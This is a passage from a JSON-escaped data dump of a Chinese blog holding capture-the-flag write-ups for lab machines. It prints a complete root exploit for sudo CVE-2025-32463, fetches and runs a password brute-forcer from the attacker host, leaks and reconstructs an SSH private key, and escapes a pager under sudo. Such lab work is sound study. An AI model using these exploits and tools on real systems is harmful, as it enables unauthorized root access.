2>/dev/null\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/local/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n```\n\n\u8bd5\u4e86\u4e00\u4e0b\u5f31\u5bc6\u7801\u4e0d\u884c\uff0c\u7136\u540e\u770b\u4e86\u4e00\u4e0bsuid\uff0c\u53d1\u73b0\u6709\u4e24\u4e2asudo\n\n/usr/bin/sudo\n\n/usr/local/bin/sudo\n\n\u5bf9\u6bd4\u4e00\u4e0b\n\n```\nwww-data@5ud0:/$ diff /usr/bin/sudo /usr/local/bin/sudo\ndiff /usr/bin/sudo /usr/local/bin/sudo\nBinary files /usr/bin/sudo and /usr/local/bin/sudo differ\n```\n\n\u800c\u4e14\u8fd9\u4e2a\u9776\u673a\u540d\u5b57\u5c31\u53eb5ud0\uff0c\u6240\u4ee5\u5f88\u6000\u7591\n\n```\nwww-data@5ud0:/$ /usr/bin/sudo -V\n/usr/bin/sudo -V\nSudo version 1.9.16p2\nSudoers policy plugin version 1.9.16p2\nSudoers file grammar version 50\nSudoers I/O plugin version 1.9.16p2\nSudoers audit plugin version 1.9.16p2\nwww-data@5ud0:/$ /usr/local/bin/sudo -V\n/usr/local/bin/sudo -V\nSudo version 1.9.6\nSudoers policy plugin version 1.9.6\nSudoers file grammar version 48\nSudoers I/O plugin version 1.9.6\nSudoers audit plugin version 1.9.6\n```\n\n/usr/local/bin/sudo\u662f\u6bd4\u8f83\u65b0\u7684\u7248\u672c\uff0c/usr/bin/sudo\u662f1.9.16p2\u7684\uff0c\u8fd9\u4e2a\u7248\u672c\u597d\u50cf\u524d\u7aef\u65f6\u95f4\u7206\u51fa\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0cgoogle\u4e00\u4e0b\n\n![image-20250715212901470](https://7r1umphk.github.io/image/20250715212901701.webp)\n\n\u7fa4\u91cc\u524d\u6bb5\u65f6\u95f4\u4e5f\u63d0\u4e86\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u6211\u4eec\u73b0\u5728\u9700\u8981\u5148~~\u62ff\u4e2a\u77e5\u9053\u5bc6\u7801\u7684\u7528\u6237\uff0cwww-data\u7684\u5bc6\u7801\u6211\u53ef\u4e0d\u77e5\u9053~~ \uff08\u7eaf\u5c0f\u4e11\uff0cCVE-2025-32463\u4e0d\u9700\u8981\u5bc6\u7801\u5c31\u53ef\u4ee5\u5229\u7528\uff09\n\ntodd\u6ca1\u6709\u627e\u5230\u4ec0\u4e48\u6709\u610f\u601d\u7684\u4e1c\u897f\uff0c\u90a3\u7206\u7834\u5bc6\u7801\u5427\n\n\u5148\u7a33\u5b9a\u4e00\u4e0bshell\n\n```\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\n```\nwww-data@5ud0:/tmp$ busybox wget 192.168.205.128/rockyou.txt\nConnecting to 192.168.205.128 (192.168.205.128:80)\nrockyou.txt          100% |********************************|  133M  0:00:00 ETA\nwww-data@5ud0:/tmp$ busybox wget 192.168.205.128/suForce\nConnecting to 192.168.205.128 (192.168.205.128:80)\nsuForce              100% |********************************|  2430  0:00:00 ETA\nwww-data@5ud0:/tmp$ chmod +x suForce \nwww-data@5ud0:/tmp$ ./suForce \n            _____                          \n ___ _   _ |  ___|__  _ __ ___ ___   \n/ __| | | || |_ / _ \\| '__/ __/ _ \\ \n\\__ \\ |_| ||  _| (_) | | | (_|  __/  \n|___/\\__,_||_|  \\___/|_|  \\___\\___|  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n code: d4t4s3c     version: v1.0.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u2753  Usage: suForce [OPTIONS]\n\n \ud83c\udf10  Get a user password with the su binary.\n\n \ud83d\udccb  Options:\n       -u <USER>      Specify the username you want to attack.\n       -w <WORDLIST>  Specify the path where the wordlist is located.\n       -h             Display this help message and exit.\n\n \ud83d\udca1  Examples:\n       suForce -u root -w rockyou.txt\n       suForce -h \n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n```\n\n\u6211\u8fd9\u5077\u4e2a\u9e21\uff0c\u6211\u77e5\u9053\u662f9000\u884c\u5de6\u53f3\u7684\uff0c\u6211\u63d0\u53d61w\u884c\uff0c\u7136\u540e\u4ece\u540e\u5f80\u524d\u7206\u7834\n\n```\nwww-data@5ud0:/tmp$ head -n 10000 rockyou.txt |tac > passwd.txt\nwww-data@5ud0:/tmp$ ls -al passwd.txt \n-rw-rw-rw- 1 www-data www-data 80577 Jul 15 09:41 passwd.txt\nwww-data@5ud0:/tmp$ ./suForce -u todd -w passwd.txt \n            _____                          \n ___ _   _ |  ___|__  _ __ ___ ___   \n/ __| | | || |_ / _ \\| '__/ __/ _ \\ \n\\__ \\ |_| ||  _| (_) | | | (_|  __/  \n|___/\\__,_||_|  \\___/|_|  \\___\\___|  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n code: d4t4s3c     version: v1.0.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ud83c\udfaf Username | todd\n\ud83d\udcd6 Wordlist | passwd.txt\n\ud83d\udd0e Status   | 8/10000/0%/nopassword\n\ud83d\udca5 Password | nopassword\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n```\n\n\u767b\u4e0a\u53bb\n\n```\nwww-data@5ud0:/tmp$ su todd\nPassword: \ntodd@5ud0:/tmp$ id\nuid=1000(todd) gid=1000(todd) groups=1000(todd)\n```\n\nhttps://github.com/pr0v3rbs/CVE-2025-32463_chwoot\n\n\u6f0f\u6d1epoc\n\n```\n#!/bin/bash\n# sudo-chwoot.sh\n# CVE-2025-32463 \u2013 Sudo EoP Exploit PoC by Rich Mirch\n#                  @ Stratascale Cyber Research Unit (CRU)\nSTAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)\ncd ${STAGE?} || exit 1\n\nif [ $# -eq 0 ]; then\n    # If no command is provided, default to an interactive root shell.\n    CMD='/bin/bash'\nelse\n    # Otherwise, use the provided arguments as the command to execute.\n    CMD='$@'\nfi\n\n# Escape the command to safely include it in a C string literal.\n# This handles backslashes and double quotes.\nCMD_C_ESCAPED=$(printf '%s' '$CMD' | sed -e 's/\\\\/\\\\\\\\/g' -e 's/'/\\\\'/g')\n\ncat > woot1337.c<<EOF\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void woot(void) {\n  setreuid(0,0);\n  setregid(0,0);\n  chdir('/');\n  execl('/bin/sh', 'sh', '-c', '${CMD_C_ESCAPED}', NULL);\n}\nEOF\n\nmkdir -p woot/etc libnss_\necho 'passwd: /woot1337' > woot/etc/nsswitch.conf\ncp /etc/group woot/etc\ngcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c\n\necho 'woot!'\nsudo -R woot woot\nrm -rf ${STAGE?}\n```\n\n\u76f4\u63a5\u590d\u5236\u8fdb\u53bb\uff0c\u4e0d\u60f3\u4e0b\u8f7d\u4e86\n\n```\ntodd@5ud0:/tmp$ vim a.sh\ntodd@5ud0:/tmp$ head -n 5 a.sh \n#!/bin/bash\n# sudo-chwoot.sh\n# CVE-2025-32463 \u2013 Sudo EoP Exploit PoC by Rich Mirch\n#                  @ Stratascale Cyber Research Unit (CRU)\nSTAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)\n```\n\n\u6539\u70b9\u4e1c\u897f\n\n![image-20250715214543419](https://7r1umphk.github.io/image/20250715214543644.webp)\n\n\u6539\u6210\u6709\u6f0f\u6d1e\u7684\n\n```\ntodd@5ud0:/tmp$ bash a.sh \nwoot!\n[sudo] password for todd: \nroot@5ud0:/# id\nuid=0(root) gid=0(root) groups=0(root),1000(todd)\nroot@5ud0:/# cat /root/root.txt /home/todd/user.txt \nflag{root-257f425d-1ea4-4b8e-8dd8-69523f25d249}\nflag{user-80e68759-1ca0-45eb-82a7-601b1f78dfe5}\n```\n\nsentence", "top": 0, "createdAt": 1752587260, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-15", "dateLabelColor": "#0969da"}, "P140": {"htmlDir": "docs/post/nei-bu-_Sneak.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Sneak", "postUrl": "post/nei-bu-_Sneak.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/140", "commentNum": 0, "wordCount": 12233, "description": "![image-20250715221242195](https://7r1umphk.github.io/image/20250715221302013.webp)\n\n\u7ee7\u7eed\u8865wp\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.186 08:00:27:d2:ee:10       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.186\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:13 EDT\nNmap scan report for 192.168.205.186\nHost is up (0.00014s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D2:EE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.05 seconds\n                                                                          \n```\n\n\u770bweb\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.186/ -v                                                                 \n*   Trying 192.168.205.186:80...\n* Connected to 192.168.205.186 (192.168.205.186) port 80\n* using HTTP/1.x\n> GET / HTTP/1.1\n> Host: 192.168.205.186\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Date: Tue, 15 Jul 2025 14:14:11 GMT\n< Server: Apache/2.4.62 (Debian)\n< Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT\n< ETag: '6-6328b152a4f57'\n< Accept-Ranges: bytes\n< Content-Length: 6\n< Content-Type: text/html\n< \nindex\n* Connection #0 to host 192.168.205.186 left intact\n                                             \n```\n\n\u7fa4\u91cc\u9762\u7684\u6a21\u677f\uff0c\u90a3\u76f4\u63a5\u7206\u7834\u76ee\u5f55\u5427\n\n\u6709\u4e2acms\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.186/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.186/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 280]\n/.php                 (Status: 403) [Size: 280]\n/index.html           (Status: 200) [Size: 6]\n/cms                  (Status: 301) [Size: 316] [--> http://192.168.205.186/cms/]\n```\n\n\u7ee7\u7eed\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.186/cms -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.186/cms\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 280]\n/index.php            (Status: 500) [Size: 0]\n/.php                 (Status: 403) [Size: 280]\n/content              (Status: 301) [Size: 324] [--> http://192.168.205.186/cms/content/]\n/modules              (Status: 301) [Size: 324] [--> http://192.168.205.186/cms/modules/]\n/rss.php              (Status: 500) [Size: 0]\n/core                 (Status: 301) [Size: 321] [--> http://192.168.205.186/cms/core/]\n/license.txt          (Status: 200) [Size: 2602]\n/install              (Status: 301) [Size: 324] [--> http://192.168.205.186/cms/install/]\n/lib                  (Status: 301) [Size: 320] [--> http://192.168.205.186/cms/lib/]\n/config.php           (Status: 200) [Size: 0]\n/styles               (Status: 301) [Size: 323] [--> http://192.168.205.186/cms/styles/]\n/robots.txt           (Status: 200) [Size: 104]\n/.php                 (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n/acp                  (Status: 301) [Size: 320] [--> http://192.168.205.186/cms/acp/]\n```\n\n\u6252\u62c9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.186/cms/license.txt   \n-----YEK ETAVIRP HSSNEPO NIGEB-----\n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\n==wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8\n-----END OPENSSH PRIVATE KEY-----\n               \n```\n\n\u51fa\u8d27\u5566\uff0c\u51fa\u8d27\u5566\uff0c\u54c8\u54c8\u54c8\n\n\u770b\u7740\u50cfssh\u79c1\u94a5\uff0c\u4f46\u662f\u597d\u50cf\u88ab\u5904\u7406\u8fc7\n\n\u770b\u8d77\u6765\u50cf\u5355\u884c\u53cd\u8f6c\uff0c\u56e0\u4e3a\u7b2c\u4e00\u884c\u7684\u5934\u662f\u88abrev\u7684\uff0c\u7b2c\u4e8c\u884c\u6ca1\u95ee\u9898\uff0c\u6700\u540e\u4e00\u884c\u6ca1\u95ee\u9898\uff0c\u6240\u4ee5\u76f4\u63a5\u53cd\u8f6c\u56de\u53bb\u5427\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cd ~/tmp                                                  \n            \n\u250c\u2500\u2500(kali\u327fkali)-[~/tmp]\n\u2514\u2500$ curl http://192.168.205.186/cms/license.txt -o id_rsa\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  2602  100  2602    0     0  1267k      0 --:--:-- --:--:-- --:--:-- 2541k\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[~/tmp]\n\u2514\u2500$ awk 'NR%2==1 {system('echo \\047'$0'\\047 | rev'); next} 1' id_rsa > id_rsa1\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[~/tmp]\n\u2514\u2500$ chmod 600 id_rsa1                                    \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[~/tmp]\n\u2514\u2500$ ssh-keygen -y -f id_rsa1\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMk/ZcOb/YUyfx7uI7lTYwamUZMR9vv6q97X+ga1pYrU0xLn910Czy+1chL3iNh7Ai45DepLnJrkRPejQ6TfeTmb2jL56R3YDygeIklQEPwI+y38FHg8wz44hir1CCcAn2dlV2Mi/MKtjVjMa2C8JYUWM065yTN5PMcrlY/1m6aAtJH8n7wpPh81SHYDY6C4KD8xF7yos5EMWhyuUa36Hg1R+uDFqgFCEl+Ixn3KBkDXFh0L/km0K5d4C8zr2NEQ5rEsDXfTb5Jn2hO7OJkGA7jtJDa917+e+X9sCdsB4PxFg5VzDWqREngHj7YoSd4QpQLgTC4Ca7YLP6RA2sQqpw9S/8ISOc4vnbbkdgDlYhRo49tLjAis97AtcxnhQImsNHmqHZWUmAbFuTHzpGOVhDmqLN3z/oZ8szRFG/yD7kowBGUhCbwfvGp1KgJYWGhpKE6zIwZA4CXndPHEox+LHXI+8IwXiQqiDOZw5HpFUD6NORUHzbUkpLd7jpjkOgqHs= sysadm@Sneak\n```\n\n\u8fde\u63a5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/tmp]\n\u2514\u2500$ ssh sysadm@192.168.205.186 -i id_rsa1\nThe authenticity of host '192.168.205.186 (192.168.205.186)' can't be established.\nED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:4: [hashed name]\n    ~/.ssh/known_hosts:6: [hashed name]\n    ~/.ssh/known_hosts:7: [hashed name]\n    ~/.ssh/known_hosts:12: [hashed name]\n    ~/.ssh/known_hosts:14: [hashed name]\n    ~/.ssh/known_hosts:15: [hashed name]\n    ~/.ssh/known_hosts:16: [hashed name]\n    ~/.ssh/known_hosts:17: [hashed name]\n    (13 additional names omitted)\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.186' (ED25519) to the list of known hosts.\nLinux Sneak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nsysadm@Sneak:~$ id\nuid=1002(sysadm) gid=1003(sysadm) groups=1003(sysadm)\nsysadm@Sneak:~$ sudo -l\nMatching Defaults entries for sysadm on Sneak:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser sysadm may run the following commands on Sneak:\n    (ALL) NOPASSWD: /usr/bin/more /var/log/custom/fake-cleanup.sh\n```\n\nmore\u662f\u4e2a\u5206\u9875\u5668\u6240\u4ee5\u4f60\u7f29\u5c0f\u5c4f\u5e55\u6267\u884c/usr/bin/more /var/log/custom/fake-cleanup.sh\u8ba9\u4ed6\u4e00\u9875\u663e\u793a\u4e0d\u4e86\u5c31\u53ef\u4ee5\u4e86\n\n![image-20250715222326570](https://7r1umphk.github.io/image/20250715222326683.webp)\n\n> [!Tip]\n>\n> sudo /usr/bin/more /var/log/custom/fake-cleanup.sh\n> \u7136\u540e\u663e\u793a\u767e\u5206\u6bd4\n>\n> \u8f93\u5165!/bin/bash\n\n```\nroot@Sneak:/home/sysadm# iduid=0(root) gid=0(root) groups=0(root                   \nroot@Sneak:/home/sysadm# cat /root/root.txt /home/user/user.txt \nflag{root-36bee2f8db4943b0f6c9d16afe11d454}                                         \nflag{user-9fcae37cb857fb5fc6f8d74c82a5d0ga}                                         \n```\n\n\u6216\u8005\u6539stty\u4e5f\u53ef\u4ee5\n\n```\nsysadm@Sneak:~$ stty rows 2\nsysadm@Sneak:~$ sudo /usr/bin/more /var/log/custom/fake-cleanup.sh\n# System cleanup script - DO NOT MODIFY\n!/bin/bash\nroot@Sneak:/home/sysadm# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nsentence", "top": 0, "createdAt": 1752590046, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-15", "dateLabelColor": "#0969da"}, "P141": {"htmlDir": "docs/post/nei-bu-_ajpsvr.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_ajpsvr", "postUrl": "post/nei-bu-_ajpsvr.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/141", "commentNum": 0, "wordCount": 11628, "description": "![image-20250716205953078](https://7r1UMPHK.github.io/image/20250716205953466.webp)\n\n![image-20250716210011392](https://7r1UMPHK.github.io/image/20250716210011546.webp)\n\n\u54c8\u54c8\uff0c\u6574\u4e2a\u6d3b\uff0c\u8865\u4e9bwp\n\n# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\u4e0e\u670d\u52a1\u63a2\u6d4b\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.190 08:00:27:b0:70:3d       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.\n\n4 responded\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0cIP \u5730\u5740\u4e3a 192.168.205.190\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u786e\u5b9a\u76ee\u6807 IP \u540e\uff0c\u4f7f\u7528 nmap 